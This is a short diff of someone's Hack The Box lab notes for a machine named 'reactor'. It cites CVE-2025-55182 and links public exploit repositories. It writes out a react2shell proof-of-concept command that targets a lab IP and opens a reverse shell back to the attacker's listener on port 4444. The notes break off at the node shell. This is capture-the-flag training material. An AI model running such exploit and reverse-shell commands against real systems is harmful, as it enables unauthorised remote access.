@@ -2,12 +2,16 @@ Hackthebox reactor
 
 ![[Screenshot_20260526_202415.png]]
 I found a critical vulnerability via research `CVE-2025-55182`
+``` 
 https://github.com/ZemarKhos/CVE-2025-55182-Exploit-PoC-Scanner
+```
 
  contains the exploit we need to use
  https://github.com/p3ta00/react2shell-poc 
  this was found out to be working out here so I used the command 
+```
  python3 react2shell-poc.py -t http://10.129.15.150:3000 --revshell --lhost 10.10.14.168 --lport 4444
+```
 this gave me reverse shell. 
 I got into the node shell 
 ```
